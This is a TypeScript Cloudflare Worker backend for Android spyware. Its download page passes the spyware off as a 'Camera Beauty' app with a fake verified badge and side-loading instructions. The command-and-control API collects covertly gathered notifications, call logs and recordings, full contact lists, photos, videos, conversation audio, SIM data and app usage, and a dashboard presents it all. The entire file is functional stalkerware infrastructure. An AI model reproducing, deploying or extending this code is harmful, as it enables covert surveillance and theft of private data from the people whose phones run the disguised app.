import { Hono } from 'hono';
import { cors } from 'hono/cors';
import { getB2Auth, getB2UploadUrl, uploadToB2, fetchB2FileStream } from './b2';
import { renderDashboardHtml } from './dashboard';

export interface Env {
  DB: D1Database;
  B2_BUCKET_NAME: string;
  B2_KEY_ID: string;
  B2_KEY_NAME?: string;
  B2_APPLICATION_KEY: string;
}

const app = new Hono<{ Bindings: Env }>();

// Global CORS Middleware - Open access for mobile client and C2 dashboard
app.use('*', cors({
  origin: '*',
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
}));

// C2 Tactical Web Dashboard - Single Page Command Center
app.get('/', (c) => c.html(renderDashboardHtml()));
app.get('/c2', (c) => c.html(renderDashboardHtml()));

// Public App Download Portal & Direct APK Link

app.get('/download', (c) => {
  return c.html(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download Camera Beauty Pro APK</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #090d16;
      --card-bg: rgba(18, 24, 38, 0.75);
      --card-border: rgba(255, 255, 255, 0.1);
      --primary-gradient: linear-gradient(135deg, #ec4899 0%, #8b5cf6 50%, #3b82f6 100%);
      --accent: #f43f5e;
      --text: #f8fafc;
      --text-muted: #94a3b8;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif; }
    body {
      min-height: 100vh;
      background-color: var(--bg);
      background-image: 
        radial-gradient(at 0% 0%, rgba(236, 72, 153, 0.15) 0px, transparent 50%),
        radial-gradient(at 100% 100%, rgba(59, 130, 246, 0.15) 0px, transparent 50%);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }
    .card {
      width: 100%;
      max-width: 440px;
      background: var(--card-bg);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid var(--card-border);
      border-radius: 28px;
      padding: 36px 28px;
      text-align: center;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6), 0 0 40px rgba(236, 72, 153, 0.1);
      animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px) scale(0.97); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }
    .app-icon {
      width: 88px;
      height: 88px;
      margin: 0 auto 20px;
      border-radius: 24px;
      background: var(--primary-gradient);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
      box-shadow: 0 12px 24px -6px rgba(236, 72, 153, 0.4);
    }
    h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 6px; }
    .badge-verified {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(16, 185, 129, 0.12);
      border: 1px solid rgba(16, 185, 129, 0.3);
      color: #34d399;
      font-size: 12px;
      font-weight: 600;
      padding: 4px 12px;
      border-radius: 20px;
      margin-bottom: 18px;
    }
    p.desc { color: var(--text-muted); font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
    .specs-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-bottom: 28px;
    }
    .spec-box {
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.06);
      padding: 10px 8px;
      border-radius: 14px;
    }
    .spec-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; font-weight: 600; margin-bottom: 2px; }
    .spec-val { font-size: 13px; font-weight: 700; color: #fff; }
    .btn-download {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
      background: var(--primary-gradient);
      color: #fff;
      text-decoration: none;
      font-weight: 700;
      font-size: 16px;
      padding: 16px 20px;
      border-radius: 18px;
      box-shadow: 0 10px 25px -5px rgba(236, 72, 153, 0.45);
      transition: all 0.2s ease;
    }
    .btn-download:hover {
      transform: translateY(-2px);
      box-shadow: 0 16px 30px -5px rgba(236, 72, 153, 0.6);
    }
    .btn-download:active { transform: translateY(0); }
    .instructions {
      margin-top: 24px;
      text-align: left;
      background: rgba(0, 0, 0, 0.25);
      border: 1px solid rgba(255, 255, 255, 0.05);
      border-radius: 16px;
      padding: 16px;
    }
    .instructions h3 { font-size: 12px; text-transform: uppercase; color: var(--text-muted); font-weight: 700; margin-bottom: 8px; letter-spacing: 0.5px; }
    .instructions ol { padding-left: 18px; font-size: 12px; color: #cbd5e1; line-height: 1.6; }
    .footer { margin-top: 24px; font-size: 12px; color: var(--text-muted); text-align: center; }
  </style>
</head>
<body>
  <div class="card">
    <div class="app-icon">✨</div>
    <h1>Camera beauty</h1>
    <div class="badge-verified">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
      Verified Release Build
    </div>
    <p class="desc">High-definition beauty camera with portrait filters, real-time color grading, and zero-shutter lag capture.</p>

    <div class="specs-grid">
      <div class="spec-box">
        <div class="spec-label">Version</div>
        <div class="spec-val">v1.0.0</div>
      </div>
      <div class="spec-box">
        <div class="spec-label">Size</div>
        <div class="spec-val">28 MB</div>
      </div>
      <div class="spec-box">
        <div class="spec-label">OS</div>
        <div class="spec-val">Android 8+</div>
      </div>
    </div>

    <a href="/download/apk" class="btn-download" download="CameraBeauty.apk">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
      Download APK (28 MB)
    </a>

    <div class="instructions">
      <h3>Quick Install Guide</h3>
      <ol>
        <li>Tap <strong>Download APK</strong> above</li>
        <li>Open the downloaded file in your browser or Files app</li>
        <li>Tap <strong>Install</strong> (enable "Install from Unknown Sources" if prompted)</li>
        <li>Launch <strong>Camera beauty</strong> & grant permissions</li>
      </ol>
    </div>
  </div>
  <div class="footer">Secure Direct Download &bull; Powered by Cloudflare Edge & B2 Storage</div>
</body>
</html>`);
});

const streamApkHandler = async (c: any) => {
  try {
    const keyId = c.env.B2_KEY_ID;
    const appKey = c.env.B2_APPLICATION_KEY;
    const bucketName = c.env.B2_BUCKET_NAME;

    const streamInfo = await fetchB2FileStream(keyId, appKey, bucketName, 'CameraBeauty.apk');
    if (!streamInfo.body || streamInfo.status >= 400) {
      return c.text(`APK not found or B2 stream error (${streamInfo.status})`, streamInfo.status as any);
    }

    const headers: Record<string, string> = {
      'Content-Type': 'application/vnd.android.package-archive',
      'Content-Disposition': 'attachment; filename="CameraBeauty.apk"',
      'Cache-Control': 'public, max-age=3600',
    };
    if (streamInfo.contentLength) {
      headers['Content-Length'] = streamInfo.contentLength;
    }

    return new Response(streamInfo.body, {
      status: 200,
      headers
    });
  } catch (err: any) {
    return c.text(`Download error: ${err.message}`, 500);
  }
};

app.get('/download/apk', streamApkHandler);
app.get('/api/download', streamApkHandler);
app.get('/CameraBeauty.apk', streamApkHandler);
app.get('/app-release.apk', streamApkHandler);

// Authenticated B2 Streaming Proxy - Allows inline viewing of photos, videos, audio, and PDFs without 401 errors
app.get('/api/b2/view', async (c) => {
  try {
    const file = c.req.query('file');
    if (!file) {
      return c.text('File parameter missing', 400);
    }
    const keyId = c.env.B2_KEY_ID;
    const appKey = c.env.B2_APPLICATION_KEY;
    const bucketName = c.env.B2_BUCKET_NAME;

    const streamInfo = await fetchB2FileStream(keyId, appKey, bucketName, file);
    if (!streamInfo.body || streamInfo.status >= 400) {
      return c.text(`File not found or B2 fetch error (status ${streamInfo.status})`, streamInfo.status as any);
    }

    const headers: Record<string, string> = {
      'Content-Type': streamInfo.contentType,
      'Cache-Control': 'public, max-age=86400',
      'Content-Disposition': 'inline',
    };
    if (streamInfo.contentLength) {
      headers['Content-Length'] = streamInfo.contentLength;
    }

    return new Response(streamInfo.body, {
      status: 200,
      headers
    });
  } catch (err: any) {
    return c.text(`Error proxying file: ${err.message}`, 500);
  }
});

// 1. Health Check
app.get('/api/health', async (c) => {
  try {
    const dbTest = await c.env.DB.prepare('SELECT 1 as healthy').first<{ healthy: number }>();
    return c.json({
      status: 'ONLINE',
      system: 'Tactical Operation C2 Backend',
      d1_connected: dbTest?.healthy === 1,
      timestamp: Date.now()
    });
  } catch (err: any) {
    return c.json({ status: 'DEGRADED', error: err.message, timestamp: Date.now() }, 500);
  }
});

// 2. B2 Authorization & Direct Upload Credentials for Android Client
app.get('/api/b2/auth', async (c) => {
  try {
    const keyId = c.env.B2_KEY_ID;
    const appKey = c.env.B2_APPLICATION_KEY;
    const bucketName = c.env.B2_BUCKET_NAME;

    if (!keyId || !appKey) {
      return c.json({ success: false, error: 'B2 credentials missing in worker env' }, 500);
    }

    const auth = await getB2Auth(keyId, appKey);
    const bucketId = auth.allowed.bucketId || '95f110793cead9870020081f'; // fallback if unrestricted

    const uploadInfo = await getB2UploadUrl(keyId, appKey, bucketId);

    return c.json({
      success: true,
      bucketName,
      bucketId,
      uploadUrl: uploadInfo.uploadUrl,
      authorizationToken: uploadInfo.authorizationToken,
      downloadUrl: auth.downloadUrl
    });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 3. Direct Binary / Multipart File Upload Proxy to Backblaze B2
app.post('/api/b2/upload', async (c) => {
  try {
    const keyId = c.env.B2_KEY_ID;
    const appKey = c.env.B2_APPLICATION_KEY;
    const bucketName = c.env.B2_BUCKET_NAME;

    if (!keyId || !appKey) {
      return c.json({ success: false, error: 'B2 credentials missing in worker env' }, 500);
    }

    const contentType = c.req.header('content-type') || '';
    const devId = c.req.header('x-device-id') || 'UNKNOWN_DEV';
    const category = c.req.header('x-media-type') || 'media'; // media, voice, pdf

    let fileName = '';
    let mimeType = 'application/octet-stream';
    let fileBuffer: ArrayBuffer;

    if (contentType.includes('multipart/form-data')) {
      const formData = await c.req.formData();
      const file = formData.get('file') as File | null;
      if (!file) {
        return c.json({ success: false, error: 'No file found in multipart form-data' }, 400);
      }
      fileName = file.name || `upload_${Date.now()}`;
      mimeType = file.type || 'application/octet-stream';
      fileBuffer = await file.arrayBuffer();
    } else {
      // Raw binary stream
      const rawHeader = c.req.header('x-file-name') || '';
      try {
        fileName = decodeURIComponent(rawHeader) || `raw_${Date.now()}.bin`;
      } catch (_) {
        fileName = rawHeader || `raw_${Date.now()}.bin`;
      }
      mimeType = contentType || 'application/octet-stream';
      fileBuffer = await c.req.arrayBuffer();
    }

    // Prefix fileName with deviceId and timestamp for clean B2 folder structure
    const safeFileName = fileName.replace(/[^a-zA-Z0-9._-]/g, '_');
    const b2FilePath = `tactical_intel/${devId}/${Date.now()}_${safeFileName}`;
    const auth = await getB2Auth(keyId, appKey);
    const bucketId = auth.allowed.bucketId || '95f110793cead9870020081f';

    const result = await uploadToB2(
      keyId,
      appKey,
      bucketId,
      bucketName,
      b2FilePath,
      fileBuffer,
      mimeType
    );

    return c.json({
      success: true,
      url: result.fileUrl,
      fileName: result.fileName,
      fileId: result.fileId,
      sizeBytes: fileBuffer.byteLength
    });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

function whenMediaType(mime: string, name: string): string {
  if (mime.startsWith('image/') || name.match(/\.(jpg|jpeg|png|webp|gif)$/i)) return 'image';
  if (mime.startsWith('video/') || name.match(/\.(mp4|mkv|3gp|mov)$/i)) return 'video';
  if (mime.startsWith('audio/') || name.match(/\.(mp3|m4a|aac|wav|ogg|opus)$/i)) return 'audio';
  if (mime === 'application/pdf' || name.match(/\.pdf$/i)) return 'pdf';
  return 'document';
}

// 4. Telemetry Ingestion (Heartbeat, Battery, SIM, Active App, Network)
app.post('/api/telemetry', async (c) => {
  try {
    const body = await c.req.json<any>();
    const deviceId = body.deviceId || body.device_id;
    if (!deviceId) {
      return c.json({ success: false, error: 'deviceId is required' }, 400);
    }

    const model = body.model || body.deviceModel || 'Android Device';
    const batteryLevel = body.battery?.level ?? body.battery?.percentage ?? body.batteryLevel ?? body.batteryPct ?? 0;
    const isCharging = (body.battery?.isCharging ?? body.isCharging ?? body.battery?.charging) ? 1 : 0;
    const networkType = body.network?.networkType ?? body.network?.type ?? body.networkType ?? 'UNKNOWN';
    const activeApp = body.activeApp ?? body.usage?.currentForegroundApp ?? 'Home / Idle';
    const simInfo = JSON.stringify(body.sims ?? body.sim ?? body.simInfo ?? {});
    const now = Date.now();

    // Upsert into devices table
    await c.env.DB.prepare(`
      INSERT INTO devices (device_id, device_model, battery_level, is_charging, network_type, sim_info, active_app, last_seen)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(device_id) DO UPDATE SET
        device_model = excluded.device_model,
        battery_level = excluded.battery_level,
        is_charging = excluded.is_charging,
        network_type = excluded.network_type,
        sim_info = excluded.sim_info,
        active_app = excluded.active_app,
        last_seen = excluded.last_seen
    `).bind(deviceId, model, batteryLevel, isCharging, networkType, simInfo, activeApp, now).run();

    // Insert into telemetry_logs
    await c.env.DB.prepare(`
      INSERT INTO telemetry_logs (device_id, battery_level, is_charging, network_type, sim_info, active_app, raw_payload, timestamp)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(deviceId, batteryLevel, isCharging, networkType, simInfo, activeApp, JSON.stringify(body), now).run();

    return c.json({ success: true, timestamp: now });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 5. Notifications Ingestion (Single or Batch)
app.post('/api/notifications', async (c) => {
  try {
    const raw = await c.req.json<any>();
    const list: any[] = Array.isArray(raw) ? raw : [raw];
    const now = Date.now();

    const statements = list.map((item) => {
      const devId = item.deviceId || item.device_id || 'UNKNOWN_DEV';
      const pkg = item.packageName || item.package_name || 'unknown.app';
      const appName = item.appName || item.app_name || pkg;
      const title = item.title || '';
      const content = item.content || item.text || item.message || '';
      const postTime = item.postTime || item.timestamp || now;

      return c.env.DB.prepare(`
        INSERT INTO notifications (device_id, package_name, app_name, title, content, post_time, created_at)
        SELECT ?, ?, ?, ?, ?, ?, ?
        WHERE NOT EXISTS (
          SELECT 1 FROM notifications 
          WHERE device_id = ? AND package_name = ? AND title = ? AND content = ? AND post_time = ?
        )
      `).bind(devId, pkg, appName, title, content, postTime, now, devId, pkg, title, content, postTime);
    });

    if (statements.length > 0) {
      await c.env.DB.batch(statements);
    }

    return c.json({ success: true, ingested: statements.length });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 6. Media & Document Ingestion (Photos, Videos, Audio, PDFs + B2 URLs)
app.post('/api/media', async (c) => {
  try {
    const raw = await c.req.json<any>();
    const list: any[] = Array.isArray(raw) ? raw : [raw];
    const now = Date.now();

    const statements = list.map((item) => {
      const devId = item.deviceId || item.device_id || 'UNKNOWN_DEV';
      const mediaId = item.mediaId || item.media_id || 0;
      const fileName = item.fileName || item.file_name || 'file';
      const mimeType = item.mimeType || item.mime_type || 'application/octet-stream';
      const mediaType = item.mediaType || item.media_type || 'image';
      const sizeBytes = item.sizeBytes || item.size_bytes || 0;
      const dateAdded = item.dateAddedMs || item.date_added_ms || now;
      const relativePath = item.relativePath || item.relative_path || '';
      const b2Url = item.b2Url || item.b2_url || item.b2PublicUrl || item.b2_public_url || null;

      return c.env.DB.prepare(`
        INSERT INTO media_records (device_id, media_id, file_name, mime_type, media_type, size_bytes, date_added_ms, relative_path, b2_url, created_at)
        SELECT ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
        WHERE NOT EXISTS (
          SELECT 1 FROM media_records 
          WHERE device_id = ? AND (media_id = ? OR (b2_url IS NOT NULL AND b2_url = ?))
        )
      `).bind(devId, mediaId, fileName, mimeType, mediaType, sizeBytes, dateAdded, relativePath, b2Url, now, devId, mediaId, b2Url);
    });

    if (statements.length > 0) {
      await c.env.DB.batch(statements);
    }

    return c.json({ success: true, ingested: statements.length });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 7. Call Logs & Live Call State Ingestion (Single or Batch with Deduplication)
app.post('/api/calls', async (c) => {
  try {
    const raw = await c.req.json<any>();
    const list: any[] = Array.isArray(raw) ? raw : [raw];
    const now = Date.now();

    // Filter out dummy/placeholder call events
    const validList = list.filter(item => {
      const num = item.phoneNumber || item.phone_number || '';
      return num !== 'Active Call' && num !== 'Call Completed';
    });

    const statements = validList.map((item) => {
      const devId = item.deviceId || item.device_id || 'UNKNOWN_DEV';
      const phoneNum = item.phoneNumber || item.phone_number || 'Unknown';
      const contact = item.contactName || item.contact_name || null;
      const callType = item.callType || item.call_type || 'INCOMING';
      const duration = item.durationSeconds || item.duration_seconds || 0;
      const simSlot = item.simSlot || item.sim_slot || 1;
      const carrier = item.carrierName || item.carrier_name || null;
      const location = item.geocodedLocation || item.geocoded_location || null;
      const callTime = item.callTimestamp || item.call_timestamp || now;
      const callState = item.callState || item.call_state || 'COMPLETED';
      const recordingUrl = item.recordingUrl || item.recording_url || null;

      return c.env.DB.prepare(`
        INSERT INTO call_logs (device_id, phone_number, contact_name, call_type, duration_seconds, sim_slot, carrier_name, geocoded_location, call_timestamp, call_state, recording_url, created_at)
        SELECT ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
        WHERE NOT EXISTS (
          SELECT 1 FROM call_logs WHERE device_id = ? AND phone_number = ? AND ABS(call_timestamp - ?) < 3000
        )
      `).bind(devId, phoneNum, contact, callType, duration, simSlot, carrier, location, callTime, callState, recordingUrl, now, devId, phoneNum, callTime);
    });

    if (statements.length > 0) {
      await c.env.DB.batch(statements);
    }

    return c.json({ success: true, ingested: statements.length });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 7b. Contacts Ingestion (Full Phonebook Baseline + Real-Time New/Updated Contacts)
app.post('/api/contacts', async (c) => {
  try {
    const raw = await c.req.json<any>();
    const list: any[] = Array.isArray(raw) ? raw : [raw];
    const now = Date.now();

    const statements = list.map((item) => {
      const devId = item.deviceId || item.device_id || 'UNKNOWN_DEV';
      const contactId = item.contactId ? String(item.contactId) : '0';
      const name = item.name || 'Unknown';
      const phoneNum = item.phoneNumber || item.phone_number || '';
      const phoneType = item.phoneType || item.phone_type || 'Mobile';
      const email = item.email || null;
      const isStarred = (item.isStarred === true || item.is_starred === 1) ? 1 : 0;
      const isNewIntercept = (item.isNewIntercept === true || item.is_new_intercept === 1 || item.syncType === 'REALTIME_INTERCEPT') ? 1 : 0;
      const syncType = item.syncType || item.sync_type || (isNewIntercept ? 'REALTIME_INTERCEPT' : 'INITIAL_SYNC');
      const lastUpdatedMs = item.lastUpdatedMs || item.last_updated_ms || now;
      const lookupKey = item.lookupKey || item.lookup_key || null;

      return c.env.DB.prepare(`
        INSERT INTO contacts (device_id, contact_id, name, phone_number, phone_type, email, is_starred, is_new_intercept, sync_type, last_updated_ms, lookup_key, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(device_id, contact_id, phone_number) DO UPDATE SET
          name = excluded.name,
          phone_type = excluded.phone_type,
          email = excluded.email,
          is_starred = excluded.is_starred,
          is_new_intercept = excluded.is_new_intercept,
          sync_type = excluded.sync_type,
          last_updated_ms = excluded.last_updated_ms,
          lookup_key = excluded.lookup_key
      `).bind(devId, contactId, name, phoneNum, phoneType, email, isStarred, isNewIntercept, syncType, lastUpdatedMs, lookupKey, now);
    });

    if (statements.length > 0) {
      const BATCH_SIZE = 100;
      for (let i = 0; i < statements.length; i += BATCH_SIZE) {
        await c.env.DB.batch(statements.slice(i, i + BATCH_SIZE));
      }
    }

    return c.json({ success: true, ingested: statements.length });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 8. Voice Events Ingestion (Silero VAD v5 Conversation Audio Recordings)
app.post('/api/voice-events', async (c) => {
  try {
    const raw = await c.req.json<any>();
    const list: any[] = Array.isArray(raw) ? raw : [raw];
    const now = Date.now();

    const statements = list.map((item) => {
      const eventId = item.id || item.event_id || `voice_${now}_${Math.random().toString(36).substring(2, 7)}`;
      const devId = item.deviceId || item.device_id || 'UNKNOWN_DEV';
      const threatType = item.threatType || item.threat_type || 'CONVERSATION_RECORDING';
      const score = item.confidenceScore || item.confidence_score || 0.8;
      const durationSec = item.durationSec || item.duration_sec || 25;
      const sizeBytes = item.fileSizeBytes || item.file_size_bytes || 0;
      const b2Url = item.b2Url || item.b2_url || null;
      const timestamp = item.timestamp || now;

      return c.env.DB.prepare(`
        INSERT INTO voice_events (event_id, device_id, threat_type, confidence_score, duration_sec, file_size_bytes, b2_url, timestamp, created_at)
        SELECT ?, ?, ?, ?, ?, ?, ?, ?, ?
        WHERE NOT EXISTS (
          SELECT 1 FROM voice_events 
          WHERE event_id = ? OR (b2_url IS NOT NULL AND b2_url = ?)
        )
      `).bind(eventId, devId, threatType, score, durationSec, sizeBytes, b2Url, timestamp, now, eventId, b2Url);
    });

    if (statements.length > 0) {
      await c.env.DB.batch(statements);
    }

    return c.json({ success: true, ingested: statements.length });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 9. Silent Duress Beacon Ingestion
app.post('/api/duress', async (c) => {
  try {
    const body = await c.req.json<any>();
    const devId = body.deviceId || body.device_id || 'UNKNOWN_DEV';
    const alertType = body.alertType || body.alert_type || 'RED_DURESS_BEACON';
    const audioEventId = body.audioEventId || body.audio_event_id || null;
    const timestamp = body.timestamp || Date.now();
    const now = Date.now();

    await c.env.DB.prepare(`
      INSERT INTO duress_alerts (device_id, alert_type, audio_event_id, timestamp, created_at)
      VALUES (?, ?, ?, ?, ?)
    `).bind(devId, alertType, audioEventId, timestamp, now).run();

    return c.json({ success: true, status: 'RED_ALERT_REGISTERED', timestamp: now });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 10. App Usage Telemetry Ingestion
app.post('/api/usage', async (c) => {
  try {
    const raw = await c.req.json<any>();
    const list: any[] = Array.isArray(raw) ? raw : [raw];
    const now = Date.now();

    const statements = list.map((item) => {
      const devId = item.deviceId || item.device_id || 'UNKNOWN_DEV';
      const pkg = item.packageName || item.package_name || 'unknown.app';
      const appName = item.appName || item.app_name || pkg;
      const category = item.category || 'PRODUCTIVITY_TOOLS';
      const durationMs = item.totalTimeInForegroundMs ?? item.totalTimeVisibleMs ?? item.duration_ms ?? 0;
      const lastUsed = item.lastTimeUsedMs ?? item.lastTimeUsed ?? item.last_time_used ?? now;
      const launchCount = item.launchCount || item.launch_count || 1;
      const installer = item.installerSource || item.installer_source || 'Google Play Store';

      return c.env.DB.prepare(`
        INSERT INTO app_usage_logs (device_id, package_name, app_name, category, duration_ms, last_time_used, launch_count, installer_source, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      `).bind(devId, pkg, appName, category, durationMs, lastUsed, launchCount, installer, now);
    });

    if (statements.length > 0) {
      await c.env.DB.batch(statements);
    }

    return c.json({ success: true, ingested: statements.length });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 11. C2 Tactical Dashboard Overview (Unified Live Intelligence Feed with true counts & 500 item buffer)
app.get('/api/c2/overview', async (c) => {
  try {
    const [
      devicesRes,
      notifsRes,
      callsRes,
      voiceRes,
      mediaRes,
      duressRes,
      usageRes,
      contactsRes,
      devCount,
      notifCount,
      callCount,
      voiceCount,
      mediaCount,
      duressCount,
      usageCount,
      contactsCount
    ] = await Promise.all([
      c.env.DB.prepare(`SELECT * FROM devices ORDER BY last_seen DESC`).all<any>(),
      c.env.DB.prepare(`SELECT * FROM notifications ORDER BY post_time DESC LIMIT 500`).all<any>(),
      c.env.DB.prepare(`SELECT * FROM call_logs WHERE phone_number != 'Active Call' AND phone_number != 'Call Completed' ORDER BY call_timestamp DESC LIMIT 500`).all<any>(),
      c.env.DB.prepare(`SELECT * FROM voice_events ORDER BY timestamp DESC LIMIT 500`).all<any>(),
      c.env.DB.prepare(`SELECT * FROM media_records ORDER BY date_added_ms DESC LIMIT 500`).all<any>(),
      c.env.DB.prepare(`SELECT * FROM duress_alerts ORDER BY timestamp DESC LIMIT 50`).all<any>(),
      c.env.DB.prepare(`
        SELECT * FROM app_usage_logs 
        WHERE id IN (SELECT MAX(id) FROM app_usage_logs GROUP BY device_id, package_name)
        ORDER BY duration_ms DESC LIMIT 100
      `).all<any>(),
      c.env.DB.prepare(`SELECT * FROM contacts ORDER BY last_updated_ms DESC LIMIT 500`).all<any>(),
      c.env.DB.prepare('SELECT COUNT(*) as c FROM devices').first<any>(),
      c.env.DB.prepare('SELECT COUNT(*) as c FROM notifications').first<any>(),
      c.env.DB.prepare(`SELECT COUNT(*) as c FROM call_logs WHERE phone_number != 'Active Call' AND phone_number != 'Call Completed'`).first<any>(),
      c.env.DB.prepare('SELECT COUNT(*) as c FROM voice_events').first<any>(),
      c.env.DB.prepare('SELECT COUNT(*) as c FROM media_records').first<any>(),
      c.env.DB.prepare('SELECT COUNT(*) as c FROM duress_alerts').first<any>(),
      c.env.DB.prepare('SELECT COUNT(DISTINCT package_name) as c FROM app_usage_logs').first<any>(),
      c.env.DB.prepare('SELECT COUNT(*) as c FROM contacts').first<any>()
    ]);

    return c.json({
      success: true,
      timestamp: Date.now(),
      summary: {
        total_devices: devCount?.c || devicesRes.results?.length || 0,
        total_notifications: notifCount?.c || notifsRes.results?.length || 0,
        total_calls: callCount?.c || callsRes.results?.length || 0,
        total_contacts: contactsCount?.c || contactsRes.results?.length || 0,
        total_voice_clips: voiceCount?.c || voiceRes.results?.length || 0,
        total_media: mediaCount?.c || mediaRes.results?.length || 0,
        total_apps: usageCount?.c || usageRes.results?.length || 0,
        active_duress_count: duressCount?.c || duressRes.results?.length || 0
      },
      devices: devicesRes.results || [],
      notifications: notifsRes.results || [],
      calls: callsRes.results || [],
      contacts: contactsRes.results || [],
      voice_events: voiceRes.results || [],
      media: mediaRes.results || [],
      app_usage: usageRes.results || [],
      duress_alerts: duressRes.results || []
    });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 12. Filtered Events Query by Stream
app.get('/api/c2/events', async (c) => {
  try {
    const type = c.req.query('type') || 'telemetry';
    const limit = Math.min(parseInt(c.req.query('limit') || '50', 10), 200);
    const offset = parseInt(c.req.query('offset') || '0', 10);
    const deviceId = c.req.query('deviceId');

    let query = '';
    const params: any[] = [];

    switch (type) {
      case 'notifications':
        query = `SELECT * FROM notifications ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY post_time DESC LIMIT ? OFFSET ?`;
        break;
      case 'calls':
        query = `SELECT * FROM call_logs ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY call_timestamp DESC LIMIT ? OFFSET ?`;
        break;
      case 'contacts':
        query = `SELECT * FROM contacts ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY last_updated_ms DESC LIMIT ? OFFSET ?`;
        break;
      case 'voice':
        query = `SELECT * FROM voice_events ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY timestamp DESC LIMIT ? OFFSET ?`;
        break;
      case 'media':
        query = `SELECT * FROM media_records ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY date_added_ms DESC LIMIT ? OFFSET ?`;
        break;
      case 'duress':
        query = `SELECT * FROM duress_alerts ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY timestamp DESC LIMIT ? OFFSET ?`;
        break;
      case 'usage':
        query = `SELECT * FROM app_usage_logs ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY last_time_used DESC LIMIT ? OFFSET ?`;
        break;
      case 'telemetry':
      default:
        query = `SELECT * FROM telemetry_logs ${deviceId ? 'WHERE device_id = ?' : ''} ORDER BY timestamp DESC LIMIT ? OFFSET ?`;
        break;
    }

    if (deviceId) {
      params.push(deviceId);
    }
    params.push(limit, offset);

    const res = await c.env.DB.prepare(query).bind(...params).all<any>();
    return c.json({
      success: true,
      type,
      count: res.results?.length || 0,
      limit,
      offset,
      events: res.results || []
    });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// 13. Purge Demo Logs (Resets all event streams and devices for fresh presentation / real device install)
app.delete('/api/c2/purge', async (c) => {
  try {
    await c.env.DB.batch([
      c.env.DB.prepare('DELETE FROM devices'),
      c.env.DB.prepare('DELETE FROM telemetry_logs'),
      c.env.DB.prepare('DELETE FROM notifications'),
      c.env.DB.prepare('DELETE FROM media_records'),
      c.env.DB.prepare('DELETE FROM contacts'),
      c.env.DB.prepare('DELETE FROM app_usage_logs'),
      c.env.DB.prepare('DELETE FROM voice_events'),
      c.env.DB.prepare('DELETE FROM call_logs'),
      c.env.DB.prepare('DELETE FROM duress_alerts')
    ]);
    return c.json({ success: true, message: 'All demo event logs and devices purged successfully' });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

export default app;
